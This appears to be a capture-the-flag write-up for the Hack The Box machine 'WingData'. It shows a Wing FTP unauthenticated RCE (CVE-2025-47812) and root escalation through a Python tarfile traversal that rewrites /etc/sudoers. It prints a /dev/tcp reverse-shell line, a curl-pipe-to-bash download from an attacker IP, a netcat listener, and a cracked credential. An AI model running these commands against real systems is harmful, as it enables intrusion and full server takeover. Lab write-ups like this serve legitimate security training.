# Machine: WingData

Date: 25-05-2026
Platform: HTB
Difficulty: Easy
Author: WhoKn0ws

---

## Recon

### Nmap:

```bash
nmap -sC -sV -T4 $MACHINE_IP
```

**Results:**

- Port 22 → SSH (OpenSSH)
- Port 80 → HTTP

**Full port scan:**

Not documented in original notes — only 22/80 were relevant to the attack path.

**Notes:**

- Target resolves to `wingdata.htb`. Landing page is a corporate file transfer portal; the "Client Portal" link exposes a separate subdomain, `ftp.wingdata.htb`
- Added to /etc/hosts: `$MACHINE_IP wingdata.htb ftp.wingdata.htb`

---

## Enumeration

### Web / subdomain enumeration:

- `http://wingdata.htb` → corporate file transfer portal landing page
- `http://ftp.wingdata.htb` → Wing FTP Server login panel — version is printed directly on the page: **Wing FTP Server v7.4.3**

### Vulnerability identification:

Searching for the disclosed version surfaced multiple high-severity public vulnerabilities, notably **CVE-2025-47812**, with a public PoC available (EDB-52347).

---

## Exploitation

### CVE-2025-47812 — Wing FTP Server Unauthenticated RCE (null-byte session injection)

The authentication handler at `/login.html` validates the `username` parameter via an internal function, `c_CheckUser()`, which uses C's `strlen()` — this stops parsing at the first null byte (`\0`). Supplying an input like `anonymous\0<lua_payload>` causes the auth check to validate cleanly against the default `anonymous` account, while everything after the null byte is written verbatim into a session file on disk as raw Lua. When the server next initializes that session file, the injected Lua executes automatically under the FTP service daemon's context — root, by default on Linux deployments.

**Steps:**

**1. Stage the reverse shell payload (`shell.sh`) on the attack machine:**

```bash
# shell.sh
bash -i >& /dev/tcp/10.10.15.123/4444 0>&1
```

**2. Serve it over HTTP:**

```bash
python3 -m http.server 8080
```

**3. Set up a listener:**

```bash
nc -lvnp 4444
```

**4. Trigger the exploit — inject the download-and-execute one-liner via the null-byte auth bypass:**

```bash
python3 CVE-2025-47812.py -u http://ftp.wingdata.htb \
  -c "curl http://10.10.15.123:8080/shell.sh|bash" -v
```

> Piping the downloaded payload straight into bash keeps the injected Lua compact and avoids session drops that heavier inline payloads can trigger.

**Result:** Reverse shell received as service account `wingftp`.

---

## Privilege Escalation

### Enumeration — wingftp to wacky (credential discovery):

Wing FTP Server stores per-user configuration as structured XML under its installation data path:

```bash
cd /opt/wftpserver/Data/1/users
ls
cat wacky.xml
```

**Findings:**

- Four user profile files present besides the baseline `anonymous` profile
- `wacky.xml` contains a populated 64-character hex string in the `<Password>` field — a SHA-256 hash

### Hash cracking:

A direct dictionary attack (`hashcat -m 1400`, rockyou.txt) against the raw hash failed, indicating a custom salt. Wing FTP Server builds its hashes as `sha256($pass . $salt)` with a hardcoded static salt (`WingFTP`) appended to the plaintext — this matches Hashcat mode 1410.

```bash
echo "32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca:WingFTP" > hash.txt
hashcat -m 1410 hash.txt /usr/share/wordlists/rockyou.txt
```

**Result:** Cracked in ~8 seconds → password `!#7Blushing^*Bride5` for user `wacky`.

### Authenticate over SSH:

```bash
ssh wacky@wingdata.htb
# Password: !#7Blushing^*Bride5
```

**Result:** Logged in as `wacky` ✓ — `user.txt` read successfully.

### Sudo enumeration:

```bash
sudo -l
```

**Findings:**

```
User wacky may run the following commands on wingdata:
    (root) NOPASSWD: /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py *
```

`wacky` can run a backup-restore Python script as root, no password, with a wildcard (`*`) argument — no parameter restrictions. The script extracts `.tar` archives placed in `/opt/backup_clients/backups/` using Python's built-in `tarfile` module.

### CVE-2025-4517 — Python tarfile path traversal:

Python's `tarfile` module does not natively sandbox extraction against directory traversal, symlink chains, or embedded hardlinks. By chaining nested directories, a symlink escape to `/etc`, and a hardlink to `/etc/sudoers` inside a crafted archive, extraction can be tricked into writing outside the intended target folder. Since the restore script runs as root via sudo and extracts from a location `wacky` fully controls, all conditions for exploitation are met.

```bash
wget http://10.10.15.123:8080/CVE-2025-4517-POC.py
python3 CVE-2025-4517-POC.py
```

The PoC builds a nested directory + symlink/hardlink chain targeting `/etc/sudoers`, deploys the crafted tar into the backup folder, and triggers extraction via the sudo-permitted script — writing `wacky ALL=(ALL) NOPASSWD: ALL` into `/etc/sudoers`, then spawns a root shell directly.

**Successful escalation:** root ✓

---

## Loot / Flags

- **user.txt:** `[FLAG REDACTED]` → `/home/wacky/user.txt`
- **root.txt:** `[FLAG REDACTED]` → `/root/root.txt`

---

## Lessons Learned

- Version banners printed directly on login pages (like the Wing FTP panel here) are often enough on their own to pivot straight to a public CVE search — always check before deeper enumeration
- Null-byte truncation bugs in C-based auth handlers (`strlen()` stopping at `\0`) are still a real bug class — worth testing on any login handler backed by native C string functions
- A cracked hash that fails against a standard wordlist attack doesn't mean the password is strong — check for known custom salt schemes (vendor-specific, like Wing FTP's static `WingFTP` salt) before giving up
- `sudo -l` after landing any low-priv shell is non-negotiable — wildcard (`*`) argument allowances in NOPASSWD rules are a recurring, high-value privesc vector
- CVE-2025-4517 (Python tarfile path traversal) is a good reminder that "trusted" standard-library extraction routines aren't automatically safe against crafted archives — especially when invoked in a privileged context
- General takeaway: weak/static salts and wildcard sudo rules are configuration-level mistakes, not just software CVEs — both are worth calling out explicitly in the lessons/defensive summary
